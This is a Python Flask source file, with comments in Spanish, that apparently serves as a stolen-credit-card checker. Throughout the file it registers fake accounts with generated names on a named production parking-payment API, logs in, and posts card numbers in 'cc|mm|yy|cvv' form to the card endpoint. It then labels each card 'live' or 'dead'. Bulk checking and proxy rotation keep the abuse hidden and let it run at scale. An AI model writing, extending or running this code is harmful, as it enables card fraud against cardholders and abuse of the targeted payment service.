import time
import os
import random
import requests
import logging
from logging.handlers import RotatingFileHandler
from faker import Faker
from flask import Flask, request, jsonify

# Faker configurado para ES-MX (nombres, telefónos locales)
fake = Faker("es_MX")
app = Flask(__name__)

# ============================================================
# CONFIGURACIÓN (preferir variables de entorno)
# ============================================================
PROXY_HOST = os.getenv("PROXY_HOST", "p.webshare.io:80")
PROXY_USER = os.getenv("PROXY_USER", "")
PROXY_PASS = os.getenv("PROXY_PASS", "")

PASSWORD = os.getenv("TEST_PASSWORD", "TestPassword123!")
EMAIL_DOMAIN = os.getenv("EMAIL_DOMAIN", "mailgrid.shop")

REGISTER_URL = os.getenv(
    "REGISTER_URL",
    "https://parkingpay-api-prod.azurewebsites.net/api/app/usuarios/registro"
)

LOGIN_URL = os.getenv(
    "LOGIN_URL",
    "https://parkingpay-api-prod.azurewebsites.net/api/auth"
)

CARD_URL = os.getenv(
    "CARD_URL",
    "https://parkingpay-api-prod.azurewebsites.net/api/app/conductor/tarjetas"
)

# ============================================================
# LOGGING (detallado)
# ============================================================
LOG_LEVEL = os.getenv("LOG_LEVEL", "DEBUG").upper()
LOG_FILE = os.getenv("LOG_FILE", "")
LOG_MAX_BYTES = int(os.getenv("LOG_MAX_BYTES", str(5 * 1024 * 1024)))
LOG_BACKUP_COUNT = int(os.getenv("LOG_BACKUP_COUNT", "3"))

logger = logging.getLogger("prkkk")
logger.setLevel(getattr(logging, LOG_LEVEL, logging.DEBUG))

formatter = logging.Formatter(
    "%(asctime)s %(levelname)s [%(name)s] %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)

stream_handler = logging.StreamHandler()
stream_handler.setFormatter(formatter)
logger.addHandler(stream_handler)

if LOG_FILE:
    file_handler = RotatingFileHandler(LOG_FILE, maxBytes=LOG_MAX_BYTES, backupCount=LOG_BACKUP_COUNT)
    file_handler.setFormatter(formatter)
    logger.addHandler(file_handler)

# ============================================================
# PROXY
# ============================================================
if PROXY_USER and PROXY_PASS:
    PROXY_URL = f"http://{PROXY_USER}:{PROXY_PASS}@{PROXY_HOST}"
    proxies = {"http": PROXY_URL, "https": PROXY_URL}
else:
    PROXY_URL = ""
    proxies = {}

# ============================================================
# SESIÓN
# ============================================================
c = requests.Session()
if proxies:
    c.proxies.update(proxies)
    logger.debug("Proxies configurados en la sesión: %s", proxies)
else:
    logger.debug("Sin proxy configurado")

# ============================================================
# HEADERS
# ============================================================
API_HEADERS = {
    "User-Agent": "Dart/3.8 (dart:io)",
    "Content-Type": "application/json; charset=utf-8"
}

# ============================================================
# UTILIDADES: generación de email y datos
# ============================================================
def generar_email():
    """
    Genera un correo utilizando exclusivamente el dominio EMAIL_DOMAIN.
    """
    nombre = fake.first_name().lower()
    apellido = fake.last_name().lower()
    numero = fake.random_int(min=1000, max=999999)
    email = f"{nombre}.{apellido}{numero}@{EMAIL_DOMAIN}"
    logger.debug("Email generado: %s", email)
    return email


def generar_datos_usuario():
    nombre = fake.first_name()
    apellidos = fake.last_name()
    telefono = "".join(str(fake.random_digit_not_null()) for _ in range(10))
    email = generar_email()

    datos = {
        "correoElectronico": email,
        "nombre": nombre,
        "apellidos": apellidos,
        "telefono": telefono,
        "contrasena": PASSWORD
    }

    logger.debug("Datos de usuario generados: correo=%s, telefono=%s", datos["correoElectronico"], mask_phone(telefono))
    return datos


def mask_phone(phone: str) -> str:
    if not phone or len(phone) < 4:
        return "****"
    return phone[:3] + "******" + phone[-1:]


def mask_token(token: str) -> str:
    if not token:
        return ""
    if len(token) <= 10:
        return "***"
    return token[:6] + "..." + token[-4:]


def mask_card(card: str) -> str:
    # card format: cc|mm|yy|cvv
    try:
        parts = card.split("|")
        cc = parts[0]
        if len(cc) >= 4:
            return "**** **** **** " + cc[-4:]
    except Exception:
        pass
    return "****"


# ============================================================
# REGISTRO
# ============================================================
def registro_usuario():
    payload = generar_datos_usuario()
    inicio = time.time()
    logger.info("Iniciando registro para %s", payload["correoElectronico"])
    try:
        r = c.post(REGISTER_URL, json=payload, headers=API_HEADERS, timeout=20)
        elapsed = round(time.time() - inicio, 3)
        logger.info("Registro HTTP %s %s (%.3fs)", r.status_code, REGISTER_URL, elapsed)
        logger.debug("Registro response body: %s", r.text[:1000])
        return {
            "ok": r.status_code in (200, 201),
            "status_code": r.status_code,
            "elapsed_seconds": elapsed,
            "email": payload["correoElectronico"],
            "telefono": mask_phone(payload["telefono"]),
            "response_body": r.text[:2000]
        }
    except requests.RequestException as e:
        logger.exception("Error al registrar usuario: %s", e)
        return {
            "ok": False,
            "status_code": None,
            "elapsed_seconds": round(time.time() - inicio, 3),
            "email": payload.get("correoElectronico"),
            "error": str(e)
        }


def registrar_usuario_hasta_exito(max_intentos=10, delay=2):
    logger.debug("Registrar usuario hasta exito: max_intentos=%s, delay=%s", max_intentos, delay)
    last_result = None
    for i in range(max_intentos):
        logger.debug("Intento de registro %s/%s", i + 1, max_intentos)
        r = registro_usuario()
        last_result = r
        if r.get("ok"):
            logger.info("Registro exitoso en intento %s para %s", i + 1, r.get("email"))
            return r["email"], r
        time.sleep(delay)
    logger.warning("No se pudo registrar usuario luego de %s intentos", max_intentos)
    return None, last_result


# ============================================================
# LOGIN
# ============================================================
def login_usuario(email):
    payload = {"correoElectronico": email, "contrasena": PASSWORD}
    inicio = time.time()
    logger.info("Iniciando login para %s", email)
    try:
        r = c.post(LOGIN_URL, json=payload, headers=API_HEADERS, timeout=20)
        elapsed = round(time.time() - inicio, 3)
        logger.info("Login HTTP %s %s (%.3fs)", r.status_code, LOGIN_URL, elapsed)
        logger.debug("Login response body: %s", r.text[:1000])

        resultado = {
            "ok": r.status_code in (200, 201),
            "status_code": r.status_code,
            "elapsed_seconds": elapsed,
            "response_body": r.text[:2000],
            "token_detectado": False,
            "token": None
        }

        if r.status_code in (200, 201):
            try:
                data = r.json()
                token = (
                    data.get("token")
                    or data.get("accessToken")
                    or (data.get("data") or {}).get("token")
                )
                resultado["token_detectado"] = bool(token)
                resultado["token"] = token
                logger.debug("Token detectado: %s", mask_token(token))
            except Exception:
                logger.exception("Error parseando JSON de login")
        return resultado
    except requests.RequestException as e:
        logger.exception("Error en login para %s: %s", email, e)
        return {
            "ok": False,
            "status_code": None,
            "elapsed_seconds": round(time.time() - inicio, 3),
            "error": str(e)
        }


# ============================================================
# PROCESAR TARJETA
# ============================================================
def procesar_tarjeta(card: str) -> dict:
    """
    card expected format: 'cc|mm|yy|cvv'
    Returns a dict with status: live / dead / error and raw response details.
    """
    logger.info("Procesando tarjeta: %s", mask_card(card))
    try:
        cc, mm, yy, cvv = card.split("|")
    except Exception:
        logger.warning("Formato de tarjeta inválido: %s", card)
        return {"status": "error", "message": "Formato inválido. Usa: cc|mm|yy|cvv", "card": card}

    # Registrar usuario hasta exito
    email, registro_info = registrar_usuario_hasta_exito()
    if not email:
        logger.error("Registro fallido antes de procesar tarjeta: %s", registro_info)
        return {"status": "error", "message": "Registro fallido", "card": card, "registro": registro_info}

    # Login
    login = login_usuario(email)
    if not login.get("ok"):
        logger.error("Login fallido para %s: %s", email, login)
        return {"status": "error", "message": "Login fallido", "card": card, "login": login}

    token = login.get("token")  # may be None
    headers = API_HEADERS.copy()

    # Construir Authorization de forma razonable:
    if token:
        if isinstance(token, str) and token.lower().startswith("bearer "):
            headers["Authorization"] = token
        else:
            headers["Authorization"] = f"Bearer {token}"

    payload = {"numero": cc, "expiracionMes": mm, "expiracionYear": yy}
    logger.debug("Enviando solicitud de tarjeta para %s (email=%s)", mask_card(card), email)

    try:
        r = c.post(CARD_URL, json=payload, headers=headers, timeout=30)

        raw_response = {
            "status_code": r.status_code,
            "headers": dict(r.headers),
            "body": r.text[:4000],
            "url": r.url,
            "request_payload": payload,
            "request_headers": {k: v for k, v in headers.items() if k.lower() != "authorization"}
        }

        logger.info("Respuesta CARD %s %s", r.status_code, CARD_URL)
        logger.debug("CARD response body: %s", r.text[:1000])

        source = r.text.lower() if r.text else ""

        # Interpretación básica similar al primer archivo
        if r.status_code == 200:
            logger.info("Tarjeta LIVE detectada: %s", mask_card(card))
            return {
                "status": "live",
                "message": "Charged CCN $1.00 MX",
                "cc": mask_card(card),
                "raw": raw_response
            }

        if r.status_code == 500 or "stripe" in source or "card_declined" in source:
            logger.info("Tarjeta DEAD/declinada: %s", mask_card(card))
            return {
                "status": "dead",
                "message": "Your card was declined",
                "cc": mask_card(card),
                "raw": raw_response
            }

        logger.warning("Gateway error %s para tarjeta %s", r.status_code, mask_card(card))
        return {
            "status": "error",
            "message": f"Gateway error {r.status_code}",
            "cc": mask_card(card),
            "raw": raw_response
        }

    except Exception as e:
        logger.exception("Excepción al procesar tarjeta %s: %s", mask_card(card), e)
        return {
            "status": "error",
            "message": str(e),
            "cc": mask_card(card),
            "raw": {"exception": str(e)}
        }


# ============================================================
# ENDPOINTS
# ============================================================
@app.route("/")
def home():
    logger.debug("GET /")
    return jsonify({
        "status": "ok",
        "message": "API fusionada activa",
        "email_domain": EMAIL_DOMAIN,
        "endpoints": {
            "GET /diagnostico": "Verificar proxy",
            "GET /diagnostico/proxy-detalle": "Diagnóstico detallado",
            "POST /diagnostico/flujo": "Probar registro y login",
            "POST /check": "Verificar una tarjeta (payload: { 'card': 'cc|mm|yy|cvv' })",
            "POST /check/bulk": "Verificar múltiples tarjetas (payload: { 'cards': [...] })"
        }
    })


# ---------------------------
# DIAGNÓSTICO (proxy básico)
# ---------------------------
@app.route("/diagnostico")
def diagnostico():
    logger.debug("GET /diagnostico")
    result = {
        "proxy_config": {
            "host": PROXY_HOST,
            "user": PROXY_USER,
            "configured": bool(PROXY_USER and PROXY_PASS)
        },
        "tests": {}
    }

    # SIN PROXY
    try:
        inicio = time.time()
        r = requests.get("https://httpbin.org/ip", timeout=10)
        result["tests"]["sin_proxy"] = {
            "status": "ok",
            "status_code": r.status_code,
            "elapsed_seconds": round(time.time() - inicio, 3),
            "ip": r.json().get("origin", "unknown")
        }
        logger.debug("IP sin proxy: %s", result["tests"]["sin_proxy"]["ip"])
    except Exception as e:
        logger.exception("Error prueba sin proxy: %s", e)
        result["tests"]["sin_proxy"] = {"status": "error", "error": str(e)}

    # CON PROXY
    try:
        inicio = time.time()
        r = c.get("https://httpbin.org/ip", timeout=10)
        result["tests"]["con_proxy"] = {
            "status": "ok",
            "status_code": r.status_code,
            "elapsed_seconds": round(time.time() - inicio, 3),
            "ip": r.json().get("origin", "unknown")
        }
        logger.debug("IP con proxy: %s", result["tests"]["con_proxy"]["ip"])
    except Exception as e:
        logger.exception("Error prueba con proxy: %s", e)
        result["tests"]["con_proxy"] = {"status": "error", "error": str(e)}

    # COMPARACIÓN
    ip_directa = result["tests"].get("sin_proxy", {}).get("ip")
    ip_proxy = result["tests"].get("con_proxy", {}).get("ip")
    result["proxy_funcionando"] = bool(ip_directa and ip_proxy and ip_directa != ip_proxy)
    result["conclusion"] = "Proxy funcionando" if result["proxy_funcionando"] else "No se pudo confirmar el proxy"

    logger.info("Diagnóstico proxy: %s", result["conclusion"])
    return jsonify(result)


# ---------------------------
# DIAGNÓSTICO PROXY DETALLE
# ---------------------------
@app.route("/diagnostico/proxy-detalle")
def diagnostico_proxy_detalle():
    logger.debug("GET /diagnostico/proxy-detalle")
    tests = {}

    # HTTPBIN
    try:
        r = c.get("https://httpbin.org/get", timeout=15)
        data = r.json()
        tests["httpbin"] = {"status_code": r.status_code, "origin": data.get("origin"), "headers": data.get("headers", {})}
    except Exception as e:
        logger.exception("Error httpbin detalle: %s", e)
        tests["httpbin"] = {"error": str(e)}

    # IPINFO
    try:
        r = c.get("https://ipinfo.io/json", timeout=15)
        tests["ipinfo"] = {"status_code": r.status_code, "data": (r.json() if r.status_code == 200 else r.text[:500])}
    except Exception as e:
        logger.exception("Error ipinfo detalle: %s", e)
        tests["ipinfo"] = {"error": str(e)}

    # PARKINGPAY HEAD
    try:
        inicio = time.time()
        r = c.head("https://parkingpay-api-prod.azurewebsites.net", timeout=10)
        tests["parkingpay"] = {
            "status_code": r.status_code,
            "elapsed_seconds": round(time.time() - inicio, 3),
            "server": r.headers.get("Server"),
            "powered_by": r.headers.get("X-Powered-By")
        }
    except Exception as e:
        logger.exception("Error parkingpay head: %s", e)
        tests["parkingpay"] = {"error": str(e)}

    return jsonify({
        "proxy": {
            "host": PROXY_HOST,
            "user": PROXY_USER,
            "configured": bool(PROXY_USER and PROXY_PASS)
        },
        "tests": tests
    })


# ---------------------------
# DIAGNÓSTICO FLUJO (register + login)
# ---------------------------
@app.route("/diagnostico/flujo", methods=["POST"])
def diagnostico_flujo():
    logger.debug("POST /diagnostico/flujo")
    trace = []
    trace.append({"stage": "start", "status": "success"})

    # REGISTER
    trace.append({"stage": "register", "status": "started"})
    registro = registro_usuario()
    if not registro["ok"]:
        logger.error("Fallo en registro durante diagnostico de flujo: %s", registro)
        trace.append({"stage": "register", "status": "failed", **registro})
        return jsonify({"status": "error", "failed_stage": "register", "trace": trace}), 400
    trace.append({"stage": "register", "status": "success", **registro})
    email = registro["email"]

    # LOGIN
    trace.append({"stage": "login", "status": "started"})
    login = login_usuario(email)
    if not login["ok"]:
        logger.error("Fallo en login durante diagnostico de flujo: %s", login)
        trace.append({"stage": "login", "status": "failed", **login})
        return jsonify({"status": "error", "failed_stage": "login", "trace": trace}), 400
    trace.append({
        "stage": "login",
        "status": "success",
        "status_code": login["status_code"],
        "elapsed_seconds": login["elapsed_seconds"],
        "token_detectado": login.get("token_detectado", False)
    })

    return jsonify({
        "status": "success",
        "message": "Registro y login funcionan correctamente",
        "email_domain": EMAIL_DOMAIN,
        "trace": trace
    })


# ---------------------------
# CHECK endpoints (tarjetas)
# ---------------------------
@app.route("/check", methods=["POST"])
def check_card():
    logger.debug("POST /check")
    data = request.get_json(silent=True) or {}
    card = data.get("card")
    if not card:
        logger.warning("Falta campo 'card' en request /check")
        return jsonify({"status": "error", "message": "Falta el campo 'card'"}), 400
    logger.info("/check request recibida para tarjeta: %s", mask_card(card))
    result = procesar_tarjeta(card)
    return jsonify(result)


@app.route("/check/bulk", methods=["POST"])
def check_bulk():
    logger.debug("POST /check/bulk")
    data = request.get_json(silent=True) or {}
    cards = data.get("cards", [])
    if not cards or not isinstance(cards, list):
        logger.warning("Falta o es inválido el campo 'cards' en /check/bulk")
        return jsonify({"status": "error", "message": "Falta el campo 'cards' (array)"}), 400
    logger.info("/check/bulk recibidas %s tarjetas", len(cards))
    results = []
    for idx, card in enumerate(cards, start=1):
        logger.debug("Procesando tarjeta %s/%s: %s", idx, len(cards), mask_card(card))
        results.append(procesar_tarjeta(card))
    return jsonify({"status": "ok", "total": len(cards), "results": results})


# ============================================================
# START
# ============================================================
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    logger.info("Arrancando API en 0.0.0.0:%s", port)
    app.run(host="0.0.0.0", port=port)
